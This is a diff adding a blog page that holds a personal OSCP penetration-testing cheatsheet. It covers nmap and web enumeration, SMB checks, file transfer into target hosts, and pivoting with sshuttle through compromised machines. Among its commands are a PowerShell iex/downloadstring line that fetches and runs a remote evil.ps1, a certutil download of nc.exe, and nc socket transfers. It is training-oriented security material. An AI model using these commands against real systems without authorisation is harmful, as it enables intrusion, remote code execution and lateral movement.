@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="ceso ">
+<meta name="description" content="Intro Well, just finished my 90 days journey of OSCP labs, now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
+Enumeration Network sniffing (using NMAP) I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:" />
+<meta name="keywords" content="CTF, Security, HTB, blog, infosec, blog, cheatsheet, hacking, linux, windows, exfiltration, privilegeescalation" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://ceso.github.io/posts/1/01/hacki/" />
+
+
+    <title>
+        
+            Hacki :: Ceso Adventures 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+    
+        <link rel="stylesheet" type="text/css" href="https://ceso.github.io/css/scroll.css">
+    
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://ceso.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://ceso.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://ceso.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://ceso.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://ceso.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://ceso.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+<meta itemprop="name" content="Hacki">
+<meta itemprop="description" content="My humble cheatsheet of most used tools, webs, etc">
+
+<meta itemprop="wordCount" content="1188">
+<meta itemprop="image" content="https://ceso.github.io/images/htb/ai/ai-header.jpg">
+
+
+
+<meta itemprop="keywords" content="blog,cheatsheet,hacking,linux,windows,exfiltration,privilegeescalation," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://ceso.github.io/images/htb/ai/ai-header.jpg"/>
+
+<meta name="twitter:title" content="Hacki"/>
+<meta name="twitter:description" content="My humble cheatsheet of most used tools, webs, etc"/>
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://ceso.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">ceso@hogsmeade$ </span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#808080;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://ceso.github.io/about/">About</a></li><li><a href="https://ceso.github.io/posts/">Posts</a></li><li><a href="https://ceso.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  
+  
+
+  <div class="post">
+
+    <div class="post-info">
+      <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>6 minutes
+
+        
+
+      </p>
+    </div>
+
+    <h2 class="post-title"><a href="https://ceso.github.io/posts/1/01/hacki/">Hacki</a></h2>
+    <div class="post-meta">
+      
+
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://ceso.github.io/tags/blog/">blog</a>&nbsp;
+        
+          #<a href="https://ceso.github.io/tags/cheatsheet/">cheatsheet</a>&nbsp;
+        
+          #<a href="https://ceso.github.io/tags/hacking/">hacking</a>&nbsp;
+        
+          #<a href="https://ceso.github.io/tags/linux/">linux</a>&nbsp;
+        
+          #<a href="https://ceso.github.io/tags/windows/">windows</a>&nbsp;
+        
+          #<a href="https://ceso.github.io/tags/exfiltration/">exfiltration</a>&nbsp;
+        
+          #<a href="https://ceso.github.io/tags/privilegeescalation/">privilegeescalation</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content"><div id="TableOfContents">
+<ul>
+    
+
+    
+    <li>
+      <a href="#intro">Intro</a>
+    
+
+    
+    </li><li>
+          <a href="#enumeration">Enumeration</a>
+    
+
+    
+    <ul>
+            <li>
+          <a href="#network-sniffing-using-nmap">Network sniffing (using NMAP)</a>
+    
+
+    
+    </li><li>
+          <a href="#web-directoriefile-scanner">Web directorie/file scanner</a>
+    
+
+    
+    <ul>
+            <li>
+          <a href="#gobuster">Gobuster</a>
+    
+
+    
+    </li><li>
+          <a href="#nikto">Nikto</a>
+    
+
+    
+    </li><li>
+          <a href="#fuff">fuff</a>
+    
+
+    
+    </li></ul></li><li>
+          <a href="#samba">Samba</a>
+    
+
+    
+    <ul>
+            <li>
+          <a href="#smbclient">smbclient</a>
+    
+
+    
+    </li><li>
+          <a href="#smbmap">smbmap</a>
+    
+
+    
+    </li><li>
+          <a href="#version-nmap-didnt-detect-it">Version (NMAP didn&rsquo;t detect it)</a>
+    
+
+    
+    </li></ul></li></ul></li><li>
+          <a href="#exfiltration">Exfiltration</a>
+    
+
+    
+    <ul>
+            <li>
+          <a href="#samba-1">Samba</a>
+    
+
+    
+    <ul>
+            <li>
+          <a href="#mount-from-windows">Mount from Windows</a>
+    
+
+    
+    </li><li>
+          <a href="#mount-from-linux">Mount from Linux</a>
+    
+
+    
+    </li></ul></li><li>
+          <a href="#http">HTTP</a>
+    
+
+    
+    <ul>
+            <li>
+          <a href="#download-from-windows">Download from Windows</a>
+    
+
+    
+    </li><li>
+          <a href="#download-from-linux">Download from Linux</a>
+    
+
+    
+    </li></ul></li><li>
+          <a href="#ftp">FTP</a>
+    
+
+    
+    </li><li>
+          <a href="#sockets">Sockets</a>
+    
+
+    
+    </li><li>
+          <a href="#rdp">RDP</a>
+    
+
+    
+    </li></ul></li><li>
+          <a href="#pivoting">Pivoting</a>
+    
+
+    
+    <ul>
+            <li>
+          <a href="#sshuttle">sshuttle</a>
+    
+
+    
+    <ul>
+            <li>
+          <a href="#one-hop">One hop</a>
+    
+
+    
+    </li><li>
+          <a href="#multi-hops">Multi-hops</a>
+  </li></ul></li></ul></li></ul>
+</div><h1 id="intro">Intro</h1>
+<p>Well, just finished my 90 days journey of OSCP labs, now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
+But this is basically the tools I tend to relie and use in this way the most.
+Hope is helpfull for you!</p>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="network-sniffing-using-nmap">Network sniffing (using NMAP)</h2>
+<p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</p>
+<pre><code class="language-console" data-lang="console">nmap -sV -O --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
+nmap -sC -sV -O --open -p- -oA nmap/full &lt;ip or cidr&gt;
+nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;
+
+--top-ports only scan the N most common ports
+--open only show open ports
+-sC use the default scripts
+-sV detect versions
+-O detect Operating Systems
+-p- scan all the ports
+-oA save the output in normal format, grepable and xml
+-sU scan UDP ports
+</code></pre><p>Is also possible to specify scripts or ports:</p>
+<pre><code class="language-console" data-lang="console">nmap --scripts vuln,safe,discovery -p 443,80 &lt;ip or cidr&gt;
+</code></pre><p>If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):</p>
+<pre><code class="language-console" data-lang="console">nmap -Pn --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
+</code></pre><h2 id="web-directoriefile-scanner">Web directorie/file scanner</h2>
+<h3 id="gobuster">Gobuster</h3>
+<p>Scan all the directories/files by extension:</p>
+<pre><code class="language-console" data-lang="console">Syntax: gobuster dir -u http://&lt;ip or hostname&gt; -w /path/to/dictionary -x &lt;extension, extension&gt; -o webscan/gobuster
+Example: gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
+</code></pre><p>For scanning without extensions, just take out the -x</p>
+<h3 id="nikto">Nikto</h3>
+<p>Sometimes Nikto shows juicy information, I tend to run it like:</p>
+<pre><code class="language-console" data-lang="console">Syntax: nikto -Format txt -o webscan/nikto-initial -host http://&lt;hostname or ip&gt; -p &lt;port&gt;
+Example: nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
+</code></pre><h3 id="fuff">fuff</h3>
+<p>Web fuzzer, <a href="https://github.com/ffuf/ffuf">you can get fuff here</a>, it basically bruteforces the dirs.</p>
+<pre><code class="language-console" data-lang="console">Syntax: ffuf -w /path/to/wordlist -u http://&lt;ip or hostname/FUZZ
+Example: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
+</code></pre><h2 id="samba">Samba</h2>
+<h3 id="smbclient">smbclient</h3>
+<p>Check if there is anonymous login enabled:</p>
+<pre><code class="language-console" data-lang="console">Syntax: smbclient -L &lt;ip or hostname&gt;
+Example: smbclient -L 192.168.24.24
+</code></pre><h3 id="smbmap">smbmap</h3>
+<p>Check which permissions we have in those shares (if there are):</p>
+<pre><code class="language-console" data-lang="console">Syntax: smbmap -H &lt;ip or hostname&gt;
+Example: smbmap -H 192.168.24.24
+
+If we have a user, will be like the following:
+smbmap -u &lt;username&gt; -H &lt;ip or hostname&gt;
+</code></pre><h3 id="version-nmap-didnt-detect-it">Version (NMAP didn&rsquo;t detect it)</h3>
+<p>Sometimes nmap doesn&rsquo;t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.</p>
+
+    <img src="https://ceso.github.io/images/cheatsheet/smb-version-wireshark.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h1 id="exfiltration">Exfiltration</h1>
+<h2 id="samba-1">Samba</h2>
+<p>Generate a samba server with Impacket:</p>
+<pre><code class="language-console" data-lang="console">Syntax: impacket-smbserver &lt;share-name&gt; &lt;path-to-share&gt;
+Example: impacket-smbserver tools /home/kali/tools
+</code></pre><h3 id="mount-from-windows">Mount from Windows</h3>
+<p>Mounting it in Windows with Powershell:</p>
+<pre><code class="language-console" data-lang="console">Syntax: New-PSDrive -Name &lt;share-name&gt; -PSProvider &quot;Filesystem&quot; -Root &lt;\\ip-hare\share-name&gt;&quot;
+Example: New-PSDrive -Name &quot;tools&quot; -PSProvider &quot;Filesystem&quot; -Root &quot;\\192.168.42.42\tools&quot;
+</code></pre><p>Mounting it without Powershell:</p>
+<pre><code class="language-console" data-lang="console">Syntax: net use &lt;letterdisk&gt; &lt;\\ip-share\share-name&gt;
+Example: net use z: \\192.168.42.42\tools&quot;
+</code></pre><p>On windows, to list mounted shares, either Powershell or without it:</p>
+<pre><code class="language-console" data-lang="console">Powershell: Get-SMBShare
+Without Powershell: net share
+</code></pre><h3 id="mount-from-linux">Mount from Linux</h3>
+<p>Is needed to have installed cifs-utils, to install it (in debian based):</p>
+<pre><code class="language-console" data-lang="console">sudo apt-get install cifs-utils
+</code></pre><p>To mount it:</p>
+<pre><code class="language-console" data-lang="console">Syntax: sudo mount -t cifs //ip-share/share-name /path/to/mount
+Example: sudo mount -t cifs //192.168.42.42/tools ~/my_share/
+</code></pre><p>To list mounted shares:</p>
+<pre><code>mount | grep cifs
+grep cifs /proc/mount
+</code></pre><h2 id="http">HTTP</h2>
+<p>From your local attacker machine, create a http server with:</p>
+<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80
+sudo python2 -m SimpleHTTPServer 80
+</code></pre><p>It&rsquo;s also possible to specify which path to share, for example:</p>
+<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80 --dir /home/kali/tools
+</code></pre><h3 id="download-from-windows">Download from Windows</h3>
+<p>There are two ways to download the files, with Powershell or without, those are with Powershell:</p>
+<pre><code class="language-console" data-lang="console">Syntax: iex(new-object net.webclient).downloadstring(&quot;http://&lt;hostname or ip&gt;/path/is/the/file&quot;)
+Example&quot; iex(new-object net.webclient).downloadstring(&quot;http://192.168.42.42/evil.ps1)
+</code></pre><p>Without powershell</p>
+<pre><code class="language-console" data-lang="console">Syntax: certutil.exe -urlcache -split -f &quot;http://&lt;hostname or ip&gt;/path/to/file&quot; name-save-file
+Example: certutil.exe -urlcache -split -f &quot;http://192.168.42.42/nc.exe&quot; nc.exe
+</code></pre><h3 id="download-from-linux">Download from Linux</h3>
+<p>There way more ways than in windows, so I will just put 1 using curl, you can look for example at wget for alternative ways:</p>
+<pre><code class="language-console" data-lang="console">Syntax: curl http://&lt;hostname or ip&gt;/path/to/file --output name-of-file
+Example: curl http://192.168.42.42/evil.php --output evil.php
+</code></pre><h2 id="ftp">FTP</h2>
+<p>If there is an ftp server which we have access, we can upload files there through it, the syntax is the same for both, windows or linux:</p>
+<pre><code class="language-console" data-lang="console">Connect and login with:
+Syntax: ftp ip
+Example: ftp 192.168.42.42
+</code></pre><p>Upload the files with:</p>
+<pre><code class="language-console" data-lang="console">Syntax: put &lt;file&gt;
+Example: put evil.py
+
+Sometimes is needed to enter in passive mode before doing anything, if is the case, just type
+pass
+followed by enter
+</code></pre><h2 id="sockets">Sockets</h2>
+<p>Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.</p>
+<p>Create the socket with:</p>
+<pre><code class="language-console" data-lang="console">Syntax: nc -lvnp &lt;port&gt; &lt; file-to-upload
+Example: nc -lvnp 443 &lt; evil.php
+
+For both cases from windows, the only difference is to write nc.exe
+</code></pre><p>And download it with:</p>
+<pre><code class="language-console" data-lang="console">Syntax: nc -v &lt;ip&gt; &lt;port&gt; &gt; file-to-download
+Example: nc -v 192.168.42.42 443 &gt; evil.php
+</code></pre><h2 id="rdp">RDP</h2>
+<p>If we have access to a windows machine with a valid user/credentials and this user is in the &ldquo;Remote Desktop Users&rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:</p>
+<pre><code class="language-console" data-lang="console">Syntax: rdesktop -g &lt;resolution&gt; -r disk:&lt;name-share&gt;=&lt;local path dir. to share&gt; &lt;ip or hostname&gt; -u &lt;username&gt; -p -
+Example: rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
+</code></pre><h1 id="pivoting">Pivoting</h1>
+<p>It&rsquo;s possible to do pivoting by using proxychains, pure nc&rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&rsquo;s a transparent proxy server that works like &ldquo;a vpn&rdquo;, and doesn&rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding.</p>
+<h2 id="sshuttle">sshuttle</h2>
+<h3 id="one-hop">One hop</h3>
+<p>Let&rsquo;s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a &ldquo;vpn&rdquo; to talk directly to those servers, for that, we use:</p>
+<pre><code class="language-console" data-lang="console">Syntax: sshuttle user@&lt;ip&gt;:&lt;port if not 22&gt; &lt;cidr-remote-net&gt;
+Example: sshuttle ceso@192.168.20.35 192.168.30.0/24
+</code></pre><h3 id="multi-hops">Multi-hops</h3>
+<p>Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a &ldquo;vpn&rdquo; through this multiple hops, so&hellip;putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn&rsquo;t intend to provide a 100% precise network diagram):</p>
+
+    <img src="https://ceso.github.io/images/cheatsheet/multiple-hop-sshuttle.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It&rsquo;s based on the example above, but is easy to extrapolate to different scenarios):</p>
+<pre><code class="language-console" data-lang="console">Host fw.example.mgmt
+  Hostname 192.168.20.35
+  User root
+Host foreman.example.mgmt
+  Hostname 192.168.30.40
+  User root
+  ProxyCommand ssh -W %h:%p fw.example.mgmt
+</code></pre><p>And now to setup the &ldquo;multiple hop vpn&rdquo;, run:</p>
+<pre><code class="language-console" data-lang="console">sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;
+</code></pre>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://ceso.github.io/posts/2019/12/shutdown-r-now/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">shutdown -r now</span>
+                </a>
+              </span>
+            
+            
+          </div>
+        </div>
+      
+    
+
+    <script src="https://utteranc.es/client.js"
+        repo="ceso/blog-source"
+        issue-term="title"
+        label="comments :speech_balloon:"
+        theme="github-dark"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+<a href="javascript:" id="return-to-top"><i class="icon-chevron-up"></i></a>
+
+
+<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+
+
+
+  </div>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            <span></span>
+            <span> <a href="https://ceso.github.io/" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Theme made by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://ceso.github.io/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+
+
+	
+		<script src="https://ceso.github.io/js/scroll.js"></script>
+	
+
+
+    </body>
+</html>
